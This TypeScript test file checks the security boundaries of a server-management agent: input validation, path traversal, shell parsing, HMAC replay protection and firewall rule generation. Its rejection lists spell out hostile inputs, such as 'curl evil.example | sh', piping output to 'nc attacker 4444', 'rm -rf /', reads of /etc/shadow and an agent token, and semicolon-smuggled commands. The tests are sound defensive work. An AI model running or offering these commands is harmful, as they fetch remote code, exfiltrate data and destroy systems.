/**
 * Server agent security tests.
 *
 * These test the boundaries the server console is built on, not the happy
 * path. Each one corresponds to something an attacker — or a tired operator at
 * 2am — would actually try:
 *
 *   "can I make it run a command I chose?"
 *   "can I reach a file outside the backup directory?"
 *   "can I replay a captured request?"
 *   "can I do a dangerous thing without the confirmation?"
 *
 * All of them must fail, and they must fail for a structural reason rather
 * than because a regex happened to match.
 */
import { describe, expect, it } from 'vitest';
import { createHmac, randomBytes } from 'node:crypto';

import { parseArgs, ValidationError, PATTERNS } from '../../services/server-agent/src/validate.js';
import { parse as parseShell, ShellError } from '../../services/server-agent/src/shell.js';
import { verify, sign } from '../../services/server-agent/src/auth.js';
import { config } from '../../services/server-agent/src/config.js';
import { renderRuleset } from '../../services/server-agent/src/ops/firewall.js';
import { tunePostgres } from '../../services/server-agent/src/ops/provision.js';
import { MANAGED_SERVICES, CONTROLLABLE_SERVICE_IDS, LOG_SOURCE_IDS } from '../../services/server-agent/src/units.js';

/* ==================================================================== */
/* Argument validation                                                   */
/* ==================================================================== */

describe('operation arguments', () => {
  const schema = {
    service: { type: 'enum', values: ['postgres', 'redis'] as const, required: true },
    lines: { type: 'int', min: 1, max: 100, default: 10 },
  } as const;

  it('accepts a declared value', () => {
    expect(parseArgs(schema, { service: 'postgres' })).toEqual({ service: 'postgres', lines: 10 });
  });

  it('refuses a value outside the enum', () => {
    // The whole point of enums here: there is no string an attacker can supply
    // that becomes a unit name.
    expect(() => parseArgs(schema, { service: 'sshd' })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: 'postgres; rm -rf /' })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: '../../etc/passwd' })).toThrow(ValidationError);
  });

  it('refuses an argument the operation did not declare', () => {
    // Silently ignoring an unknown key is how a typo in `service` becomes
    // "act on the default", so unknown keys are a rejection.
    expect(() => parseArgs(schema, { service: 'redis', unit: 'sshd' })).toThrow(ValidationError);
  });

  it('rejects keys that exist on Object.prototype', () => {
    // `key in schema` would accept these, because `in` walks the prototype
    // chain — which would quietly undo the rule above for exactly the keys a
    // prototype-pollution attempt reaches for.
    expect(() => parseArgs(schema, { service: 'redis', constructor: 'x' })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: 'redis', toString: 'x' })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: 'redis', hasOwnProperty: 'x' })).toThrow(ValidationError);
  });

  it('refuses an operation with no schema when arguments are sent', () => {
    expect(() => parseArgs(undefined, { anything: 1 })).toThrow(ValidationError);
    expect(parseArgs(undefined, {})).toEqual({});
  });

  it('enforces integer bounds rather than clamping', () => {
    expect(() => parseArgs(schema, { service: 'redis', lines: 0 })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: 'redis', lines: 10_000 })).toThrow(ValidationError);
    expect(() => parseArgs(schema, { service: 'redis', lines: 1.5 })).toThrow(ValidationError);
  });

  it('requires required arguments', () => {
    expect(() => parseArgs(schema, {})).toThrow(ValidationError);
  });

  it('ignores a non-object body rather than trusting it', () => {
    expect(() => parseArgs(schema, 'postgres')).toThrow(ValidationError);
    expect(() => parseArgs(schema, ['postgres'])).toThrow(ValidationError);
    expect(() => parseArgs(schema, null)).toThrow(ValidationError);
  });
});

/* ==================================================================== */
/* Path traversal                                                        */
/* ==================================================================== */

describe('identifier patterns', () => {
  it('rejects traversal in a backup id', () => {
    const traversals = [
      '../../etc/shadow',
      '..%2f..%2fetc%2fpasswd',
      '/etc/passwd',
      'a/../../b',
      './../secret.dump',
      'backup\u0000.dump',
      'back up.dump',
    ];
    for (const attempt of traversals) {
      expect(PATTERNS.backupId.test(attempt), attempt).toBe(false);
    }
  });

  it('accepts the names the agent itself writes', () => {
    expect(PATTERNS.backupId.test('kairos-platform-20260923T101500Z.dump')).toBe(true);
  });

  it('rejects a service name that is not an identifier', () => {
    for (const attempt of ['../sshd', 'postgres unit', 'a'.repeat(200), 'foo/bar', '-rf']) {
      expect(PATTERNS.identifier.test(attempt), attempt).toBe(false);
    }
  });

  it('only accepts well-formed CIDRs for firewall sources', () => {
    expect(PATTERNS.cidr.test('192.168.1.0/24')).toBe(true);
    expect(PATTERNS.cidr.test('10.0.0.5')).toBe(true);
    for (const attempt of ['0.0.0.0/0; nft flush ruleset', 'any', '$(whoami)', '192.168.1.0/24 accept']) {
      expect(PATTERNS.cidr.test(attempt), attempt).toBe(false);
    }
  });
});

/* ==================================================================== */
/* KAIROS Shell parsing                                                  */
/* ==================================================================== */

describe('KAIROS shell', () => {
  it('maps a known command to an operation id', () => {
    expect(parseShell('kairos status').operation).toBe('kairos_status');
    expect(parseShell('kairos database status').operation).toBe('database_status');
    expect(parseShell('kairos service restart postgres')).toMatchObject({
      operation: 'service_restart',
      args: { service: 'postgres' },
    });
  });

  it('prefers the longer literal path', () => {
    // `kairos logs sources` must not be read as `kairos logs <source=sources>`.
    expect(parseShell('kairos logs sources').operation).toBe('logs_sources');
    expect(parseShell('kairos logs api').operation).toBe('logs_read');
  });

  it('refuses anything that is not in the grammar', () => {
    for (const line of [
      'rm -rf /',
      'sudo su',
      'cat /etc/kairos/agent.token',
      'bash -c "curl evil.example | sh"',
      'kairos status; rm -rf /',
      'kairos status && cat /etc/shadow',
      'kairos status | nc attacker 4444',
      '$(reboot)',
      '`reboot`',
      'kairos service restart sshd',
      'kairos service restart ../../sshd',
    ]) {
      expect(() => parseShell(line), line).toThrow(ShellError);
    }
  });

  it('treats shell metacharacters as ordinary text, not syntax', () => {
    // There is no pipe or redirection implementation, so these cannot be
    // exploited — they simply fail to match a keyword.
    let error: unknown;
    try {
      parseShell('kairos status > /etc/passwd');
    } catch (thrown) {
      error = thrown;
    }
    expect(error).toBeInstanceOf(ShellError);
  });

  it('refuses an argument outside the allowed values', () => {
    expect(() => parseShell('kairos logs /var/log/auth.log')).toThrow(ShellError);
    expect(() => parseShell('kairos storage usage ../../root')).toThrow(ShellError);
  });

  it('only resolves to operations that exist in the registry', () => {
    // Every service the shell will act on must be one the agent will control,
    // or the grammar has drifted from the allowlist.
    for (const id of CONTROLLABLE_SERVICE_IDS) {
      expect(parseShell(`kairos service restart ${id}`).args['service']).toBe(id);
    }
    for (const id of LOG_SOURCE_IDS) {
      expect(parseShell(`kairos logs ${id}`).args['source']).toBe(id);
    }
  });

  it('does not let a quoted argument smuggle a second command', () => {
    const parsed = parseShell('kairos backup verify "kairos-platform-20260101T000000Z.dump"');
    expect(parsed.operation).toBe('backup_verify');
    expect(parsed.args['backup']).toBe('kairos-platform-20260101T000000Z.dump');
  });
});

/* ==================================================================== */
/* Agent request authentication                                          */
/* ==================================================================== */

describe('agent request signing', () => {
  const body = JSON.stringify({ operation: 'kairos_status' });

  const headersFor = (overrides: Record<string, string> = {}, path = '/agent/execute', method = 'POST') => {
    const timestamp = String(Date.now());
    const nonce = randomBytes(16).toString('hex');
    return {
      'x-kairos-timestamp': timestamp,
      'x-kairos-nonce': nonce,
      'x-kairos-signature': sign({ timestamp, nonce, method, path, body }),
      ...overrides,
    };
  };

  it('accepts a correctly signed request', () => {
    expect(verify(headersFor(), 'POST', '/agent/execute', body).ok).toBe(true);
  });

  it('rejects a request with no signature', () => {
    expect(verify({}, 'POST', '/agent/execute', body).ok).toBe(false);
  });

  it('rejects a tampered body', () => {
    const headers = headersFor();
    const result = verify(headers, 'POST', '/agent/execute', JSON.stringify({ operation: 'server_reboot' }));
    expect(result.ok).toBe(false);
  });

  it('rejects a signature replayed against a different route', () => {
    // A captured `GET /agent/health` must not become `POST /agent/server/reboot`.
    const headers = headersFor({}, '/agent/execute', 'POST');
    expect(verify(headers, 'POST', '/agent/pty', body).ok).toBe(false);
    expect(verify(headers, 'GET', '/agent/execute', body).ok).toBe(false);
  });

  it('rejects a signature made with the wrong key', () => {
    const timestamp = String(Date.now());
    const nonce = randomBytes(16).toString('hex');
    const signature = createHmac('sha256', 'not-the-agent-token')
      .update([timestamp, nonce, 'POST', '/agent/execute', body].join('\n'))
      .digest('hex');
    expect(
      verify(
        { 'x-kairos-timestamp': timestamp, 'x-kairos-nonce': nonce, 'x-kairos-signature': signature },
        'POST',
        '/agent/execute',
        body,
      ).ok,
    ).toBe(false);
  });

  it('rejects a stale timestamp', () => {
    const timestamp = String(Date.now() - config.maxClockSkewMs - 5_000);
    const nonce = randomBytes(16).toString('hex');
    const signature = sign({ timestamp, nonce, method: 'POST', path: '/agent/execute', body });
    expect(
      verify(
        { 'x-kairos-timestamp': timestamp, 'x-kairos-nonce': nonce, 'x-kairos-signature': signature },
        'POST',
        '/agent/execute',
        body,
      ).ok,
    ).toBe(false);
  });

  it('rejects a replayed nonce', () => {
    const headers = headersFor();
    expect(verify(headers, 'POST', '/agent/execute', body).ok).toBe(true);
    // Same request, second time. Still inside the clock window, so only the
    // nonce cache can catch it.
    const second = verify(headers, 'POST', '/agent/execute', body);
    expect(second.ok).toBe(false);
    if (!second.ok) expect(second.reason).toMatch(/replay/i);
  });

  it('rejects a malformed nonce', () => {
    expect(verify(headersFor({ 'x-kairos-nonce': 'short' }), 'POST', '/agent/execute', body).ok).toBe(false);
  });
});

/* ==================================================================== */
/* Firewall generation                                                   */
/* ==================================================================== */

describe('firewall ruleset', () => {
  const base = { httpsOpen: true, httpOpen: true, sshFrom: null, updatedAt: new Date().toISOString() };

  it('denies inbound by default', () => {
    expect(renderRuleset(base)).toMatch(/chain input \{[\s\S]*policy drop;/);
  });

  it('never opens the internal ports', () => {
    const ruleset = renderRuleset({ ...base, sshFrom: '10.0.0.0/8' });
    // The guarantee is negative: these ports appear nowhere, so the default
    // drop covers them.
    for (const port of [5432, 6379, 9000, 9001]) {
      expect(ruleset).not.toMatch(new RegExp(`dport ${port}\\b`));
    }
  });

  it('only accepts loopback and established traffic before the explicit rules', () => {
    const ruleset = renderRuleset(base);
    expect(ruleset).toContain('iif lo accept');
    expect(ruleset).toContain('ct state established,related accept');
    expect(ruleset).toContain('ct state invalid drop');
  });

  it('omits the HTTPS rule when HTTPS is closed', () => {
    expect(renderRuleset({ ...base, httpsOpen: false })).not.toContain('tcp dport 443 accept');
    expect(renderRuleset(base)).toContain('tcp dport 443 accept');
  });

  it('refuses to write a rule from a malformed source address', () => {
    // Belt and braces: the schema already validated this, and the renderer
    // checks again because it is the last thing between a string and a file
    // the kernel parses as policy.
    for (const bad of ['0.0.0.0/0 accept; drop', 'any', '1.2.3.4 tcp dport 22 accept']) {
      expect(() => renderRuleset({ ...base, sshFrom: bad })).toThrow();
    }
  });

  it('writes a well-formed SSH rule for a valid CIDR', () => {
    expect(renderRuleset({ ...base, sshFrom: '192.168.1.0/24' })).toContain(
      'ip saddr 192.168.1.0/24 tcp dport 22 accept',
    );
  });
});

/* ==================================================================== */
/* Service table                                                         */
/* ==================================================================== */

describe('managed services', () => {
  it('will not control the agent or Docker', () => {
    // Restarting the agent from a request it is serving cannot report its own
    // outcome; stopping Docker from inside a container Docker runs removes the
    // means to bring it back.
    expect(CONTROLLABLE_SERVICE_IDS).not.toContain('agent');
    expect(CONTROLLABLE_SERVICE_IDS).not.toContain('docker');
  });

  it('does not manage anything outside KAIROS', () => {
    const ids = MANAGED_SERVICES.map((service) => service.id);
    for (const forbidden of ['ssh', 'sshd', 'systemd', 'cron', 'sudo', 'dbus']) {
      expect(ids).not.toContain(forbidden);
    }
  });

  it('gives every service a unit or a container to look for', () => {
    for (const service of MANAGED_SERVICES) {
      expect(service.unit ?? service.container, service.id).toBeDefined();
    }
  });
});

/* ==================================================================== */
/* PostgreSQL tuning                                                     */
/* ==================================================================== */

describe('postgres tuning', () => {
  it('derives max_connections from work_mem rather than picking a number', () => {
    const small = tunePostgres(4 * 1024 ** 3, 4);
    const large = tunePostgres(64 * 1024 ** 3, 16);

    // The specific failure this guards against: shipping max_connections=300
    // on a 4GB laptop, where 300 connections can allocate several GB above
    // shared_buffers and get the process OOM-killed.
    expect(small.maxConnections).toBeLessThan(large.maxConnections);
    expect(small.maxConnections).toBeGreaterThanOrEqual(20);
    expect(large.maxConnections).toBeLessThanOrEqual(200);
  });

  it('leaves room for everything else on the machine', () => {
    const tuning = tunePostgres(16 * 1024 ** 3, 8);
    const sharedBuffersMb = Number(tuning.sharedBuffers.replace('MB', ''));
    // This is a laptop also running the API, Redis, nginx and a browser, so
    // shared_buffers stays well under the 25% a dedicated server would take.
    expect(sharedBuffersMb).toBeLessThan((16 * 1024) / 4);
  });

  it('assumes SSD rather than spinning disk', () => {
    const tuning = tunePostgres(8 * 1024 ** 3, 4);
    expect(tuning.randomPageCost).toBeLessThan(2);
    expect(tuning.effectiveIoConcurrency).toBeGreaterThan(100);
  });

  it('explains every number it chose', () => {
    expect(tunePostgres(8 * 1024 ** 3, 4).rationale.length).toBeGreaterThan(0);
  });
});
